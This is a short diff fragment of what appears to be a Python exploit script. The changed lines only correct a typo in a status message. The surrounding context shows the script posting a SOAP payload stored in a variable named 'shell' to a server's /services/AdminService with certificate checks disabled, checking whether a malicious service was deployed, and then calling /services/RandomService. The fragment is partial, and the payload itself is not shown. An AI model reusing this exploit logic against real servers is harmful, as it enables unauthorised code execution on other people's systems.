@@ -43,7 +43,7 @@ def doit(url):
 </soapenv:Envelope>'''
     d=requests.post(url+"/services/AdminService",verify=False,headers={"Content-Type":"application/xml","SOAPAction":"somethi"},data=shell)
     if 'processing</Admin>' in d.content:
-        print "deplay service finised!"
+        print "deploy service finished!"
     else:
         print "may be not vulnerable!!"
     requests.post(url+"/services/RandomService", verify=False,
